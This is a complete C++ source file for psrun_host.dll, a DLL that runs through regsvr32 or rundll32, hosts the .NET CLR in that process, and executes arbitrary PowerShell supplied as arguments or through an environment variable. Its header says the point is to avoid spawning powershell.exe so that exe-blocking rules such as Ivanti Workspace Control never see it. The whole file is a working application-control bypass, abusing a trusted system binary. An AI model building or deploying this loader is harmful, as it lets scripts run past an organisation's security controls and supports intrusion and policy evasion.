//==============================================================================
// psrun_host.cpp - regsvr32 springboard: in-process PowerShell via CLR hosting
//------------------------------------------------------------------------------
// Hosts the .NET CLR *inside the regsvr32.exe process* and runs PowerShell
// script through System.Management.Automation. No powershell.exe / pwsh.exe
// child process is created - exe-blocking rules (Ivanti Workspace Control)
// never see them; only regsvr32.exe plus two DLL loads are visible.
//
// Toolchain-agnostic: NO mscoree.h/metahost.h include, no import libs, no CRT
// deps beyond defaults. Compiles with mingw-w64 (mac/linux) and MSVC (cl).
// x64 target: use the 64-bit regsvr32 (C:\Windows\System32).
//
// Entry points (dllexport)
//   DllRegisterServer  : runs payload from env PSRUN_ARGS if set, else no-op
//   DllInstall         : payload; args from regsvr32 /i:"..." or PSRUN_ARGS
//   DllUnregisterServer: no-op
//   RunPSW             : optional rundll32 entry, same payload
//
// Zero registry writes, no elevation, static CRT.
//
// Requires: .NET Framework 4.x (CLR v4.0.30319) and PSRunner.dll (build on any
//           Windows box with build_runner.cmd) next to this DLL.
// Output  : %TEMP%\psrun.log     (script output, override with -out)
//           %TEMP%\psrun_err.log (native-side failures)
//==============================================================================

#include <windows.h>
#include <wchar.h>

typedef HRESULT (WINAPI *PFN_CLRCreateInstance)(REFCLSID, REFIID, LPVOID*);

static HMODULE g_hSelf = NULL;

//==============================================================================
// CLR hosting interfaces - self-contained declarations.
// vtable order verified against the SDK/mingw mscoree.idl and Wine's
// interop-tested metahost.idl (mingw ships no <metahost.h>).
//==============================================================================

// {9280188D-0E8E-4867-B30C-7FA83884E8DE}
static const GUID kCLSID_CLRMetaHost =
    {0x9280188D,0x0E8E,0x4867,{0xB3,0x0C,0x7F,0xA8,0x38,0x84,0xE8,0xDE}};
// {D332DB9E-B9B3-4125-8207-A14884F53216}
static const GUID kIID_ICLRMetaHost =
    {0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
// {BD39D1D2-BA2F-486A-89B0-B4B0CB466891}
static const GUID kIID_ICLRRuntimeInfo =
    {0xBD39D1D2,0xBA2F,0x486A,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
// {90F1A06E-7712-4762-86B5-7A5EBA6BDB02}
static const GUID kCLSID_CLRRuntimeHost =
    {0x90F1A06E,0x7712,0x4762,{0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02}};
// {90F1A06C-7712-4762-86B5-7A5EBA6BDB02}
static const GUID kIID_ICLRRuntimeHost =
    {0x90F1A06C,0x7712,0x4762,{0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02}};

struct IHostControl;
struct ICLRControl;

// ICLRMetaHost - only slot 3 (GetRuntime) is used
struct ICLRMetaHost : public IUnknown
{
    virtual HRESULT STDMETHODCALLTYPE GetRuntime(
        LPCWSTR pwzVersion, REFIID riid, LPVOID *ppRuntime) = 0;
    // remaining slots unused - not declared
};

// ICLRRuntimeInfo - slots 3..9 declared in exact header order; only
// GetInterface (slot 9) is called
struct ICLRRuntimeInfo : public IUnknown
{
    virtual HRESULT STDMETHODCALLTYPE GetVersionString(
        LPWSTR pwzBuffer, DWORD *pcchBuffer) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetRuntimeDirectory(
        LPWSTR pwzBuffer, DWORD *pcchBuffer) = 0;
    virtual HRESULT STDMETHODCALLTYPE IsLoaded(
        HANDLE hndProcess, BOOL *pbLoaded) = 0;
    virtual HRESULT STDMETHODCALLTYPE LoadErrorString(
        UINT iResourceID, LPWSTR pwzBuffer, DWORD *pcchBuffer, LONG iLocale) = 0;
    virtual HRESULT STDMETHODCALLTYPE LoadLibrary(
        LPCWSTR pwzDllName, HMODULE *phndModule) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetProcAddress(
        LPCSTR pszProcName, LPVOID *ppProc) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetInterface(
        REFCLSID rclsid, REFIID riid, LPVOID *ppUnk) = 0;
    // remaining slots unused - not declared
};

// ICLRRuntimeHost - full vtable; only Start and ExecuteInDefaultAppDomain used
struct ICLRRuntimeHost : public IUnknown
{
    virtual HRESULT STDMETHODCALLTYPE Start() = 0;
    virtual HRESULT STDMETHODCALLTYPE Stop() = 0;
    virtual HRESULT STDMETHODCALLTYPE SetHostControl(IHostControl *pHostControl) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCLRControl(ICLRControl **ppControl) = 0;
    virtual HRESULT STDMETHODCALLTYPE UnloadAppDomain(
        DWORD dwAppDomainId, BOOL fWaitUntilDone) = 0;
    virtual HRESULT STDMETHODCALLTYPE ExecuteInAppDomain(
        DWORD dwAppDomainId, void *pCallback, void *cookie) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentAppDomainId(
        DWORD *pdwAppDomainId) = 0;
    virtual HRESULT STDMETHODCALLTYPE ExecuteApplication(
        LPCWSTR pwzAppFullName, DWORD dwManifestPaths,
        LPCWSTR *ppwzManifestPaths, DWORD dwActivationData,
        LPCWSTR *ppwzActivationData, int *pReturnValue) = 0;
    virtual HRESULT STDMETHODCALLTYPE ExecuteInDefaultAppDomain(
        LPCWSTR pwzAssemblyPath, LPCWSTR pwzTypeName, LPCWSTR pwzMethodName,
        LPCWSTR pwzArgument, DWORD *pReturnValue) = 0;
};

//==============================================================================

// Append one line to %TEMP%\psrun_err.log (UTF-8). Native-side failures only;
// script output/errors go through PSRunner into psrun.log.
static void ErrLog(const wchar_t *msg, HRESULT hr)
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    wchar_t path[MAX_PATH];
    if (GetTempPathW(MAX_PATH, path) == 0) return;
    lstrcatW(path, L"psrun_err.log");

    wchar_t line[640];
    if (hr != S_OK)
        wsprintfW(line, L"[%02d:%02d:%02d] %s (hr=0x%08X)\r\n",
                  st.wHour, st.wMinute, st.wSecond, msg, (unsigned)hr);
    else
        wsprintfW(line, L"[%02d:%02d:%02d] %s\r\n",
                  st.wHour, st.wMinute, st.wSecond, msg);

    char ansi[1024];
    int n = WideCharToMultiByte(CP_UTF8, 0, line, -1, ansi, sizeof(ansi), NULL, NULL);
    if (n <= 0) return;

    HANDLE hFile = CreateFileW(path, FILE_APPEND_DATA,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD wrote = 0;
    WriteFile(hFile, ansi, (DWORD)n - 1, &wrote, NULL);
    CloseHandle(hFile);
}

//------------------------------------------------------------------------------

// Host CLR v4 and run PSRunner.Entry.Run(args) in the default appdomain.
// Never calls Stop: the runtime lives until the process exits by itself.
static HRESULT HostAndRun(const wchar_t *args)
{
    HMODULE hMscoree = LoadLibraryW(L"mscoree.dll");
    if (!hMscoree) {
        ErrLog(L"LoadLibraryW(mscoree.dll) failed (.NET Framework 4 present?)",
               HRESULT_FROM_WIN32(GetLastError()));
        return E_FAIL;
    }

    PFN_CLRCreateInstance pfnCLRCreateInstance =
        (PFN_CLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!pfnCLRCreateInstance) {
        ErrLog(L"GetProcAddress(CLRCreateInstance) failed", E_FAIL);
        return E_FAIL;
    }

    ICLRMetaHost *metaHost = NULL;
    HRESULT hr = pfnCLRCreateInstance(kCLSID_CLRMetaHost, kIID_ICLRMetaHost,
                                      (LPVOID *)&metaHost);
    if (FAILED(hr)) { ErrLog(L"CLRCreateInstance", hr); return hr; }

    ICLRRuntimeInfo *runtimeInfo = NULL;
    hr = metaHost->GetRuntime(L"v4.0.30319", kIID_ICLRRuntimeInfo,
                              (LPVOID *)&runtimeInfo);
    metaHost->Release();
    if (FAILED(hr)) { ErrLog(L"ICLRMetaHost::GetRuntime(v4.0.30319)", hr); return hr; }

    ICLRRuntimeHost *runtimeHost = NULL;
    hr = runtimeInfo->GetInterface(kCLSID_CLRRuntimeHost, kIID_ICLRRuntimeHost,
                                   (LPVOID *)&runtimeHost);
    runtimeInfo->Release();
    if (FAILED(hr)) { ErrLog(L"ICLRRuntimeInfo::GetInterface", hr); return hr; }

    hr = runtimeHost->Start();
    if (FAILED(hr)) { ErrLog(L"ICLRRuntimeHost::Start", hr); return hr; }

    // PSRunner.dll must sit next to this DLL
    wchar_t self[MAX_PATH];
    if (GetModuleFileNameW(g_hSelf, self, MAX_PATH) == 0) {
        ErrLog(L"GetModuleFileNameW failed", HRESULT_FROM_WIN32(GetLastError()));
        return E_FAIL;
    }
    wchar_t *slash = wcsrchr(self, L'\\');
    if (slash) *slash = L'\0'; else lstrcpyW(self, L".");

    wchar_t runner[MAX_PATH];
    lstrcpyW(runner, self);
    lstrcatW(runner, L"\\PSRunner.dll");
    if (GetFileAttributesW(runner) == INVALID_FILE_ATTRIBUTES) {
        wchar_t msg[MAX_PATH + 64];
        wsprintfW(msg, L"PSRunner.dll niet gevonden in: %s", self);
        ErrLog(msg, 0);
        runtimeHost->Release();
        return E_FAIL;
    }

    // laat zwart-op-wit zien welke dll er ligt (stale-copy detectie)
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(runner, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        SYSTEMTIME stF;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &stF);
        wchar_t info[MAX_PATH + 64];
        wsprintfW(info, L"runner gevonden: %s (%u bytes, %02d-%02d %02d:%02d)",
                  runner, fd.nFileSizeLow,
                  stF.wDay, stF.wMonth, stF.wHour, stF.wMinute);
        FindClose(hFind);
        ErrLog(info, 0);
    }

    DWORD retVal = 0;
    hr = runtimeHost->ExecuteInDefaultAppDomain(runner, L"PSRunner.Entry",
                                                L"Run", args, &retVal);
    if (FAILED(hr)) {
        wchar_t msg[160];
        wsprintfW(msg, L"ExecuteInDefaultAppDomain mislukt (entry/type/signature?)");
        ErrLog(msg, hr);
        runtimeHost->Release();
        return hr;
    }

    runtimeHost->Release();
    return S_OK;
}

// strip spaces / a stray outer quote pair regsvr32 may have left in /i:"..."
static wchar_t *TrimArgs(wchar_t *s)
{
    while (*s == L' ') ++s;
    size_t len = wcslen(s);
    while (len > 0 && s[len - 1] == L' ') s[--len] = L'\0';
    if (len >= 2 && s[0] == L'"' && s[len - 1] == L'"') {
        s[len - 1] = L'\0';
        ++s;
    }
    return s;
}

static wchar_t s_args[8192];

//==============================================================================
// exports
//==============================================================================

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        g_hSelf = (HMODULE)hinst;
    }
    return TRUE;
}

// regsvr32.exe psrun_host.dll  ->  payload only when PSRUN_ARGS is set
extern "C" HRESULT __declspec(dllexport) __stdcall
DllRegisterServer(void)
{
    DWORD n = GetEnvironmentVariableW(L"PSRUN_ARGS", s_args, 8192);
    if (n == 0 || n >= 8192) return S_OK;   // plain register = silent no-op
    return HostAndRun(s_args);
}

extern "C" HRESULT __declspec(dllexport) __stdcall
DllUnregisterServer(void)
{
    return S_OK;
}

// regsvr32 /i:"<args>" psrun_host.dll   (add /n to skip DllRegisterServer)
extern "C" HRESULT __declspec(dllexport) __stdcall
DllInstall(BOOL bInstall, LPCWSTR pszCmdLine)
{
    if (!bInstall) return S_OK;

    if (pszCmdLine && *pszCmdLine) {
        lstrcpynW(s_args, pszCmdLine, 8192);
    } else {
        DWORD n = GetEnvironmentVariableW(L"PSRUN_ARGS", s_args, 8192);
        if (n == 0 || n >= 8192) {
            ErrLog(L"DllInstall: no args - use /i:\"-c <script>\" / \"-f <ps1>\" "
                   L"or env PSRUN_ARGS", 0);
            return E_INVALIDARG;
        }
    }
    return HostAndRun(TrimArgs(s_args));
}

// optional 2nd vector: rundll32 psrun_host.dll,RunPS -c <script>
extern "C" void __declspec(dllexport) __stdcall
RunPSW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(hinst);
    UNREFERENCED_PARAMETER(nCmdShow);
    if (lpszCmdLine && *lpszCmdLine) {
        lstrcpynW(s_args, lpszCmdLine, 8192);
        HostAndRun(TrimArgs(s_args));
    }
}
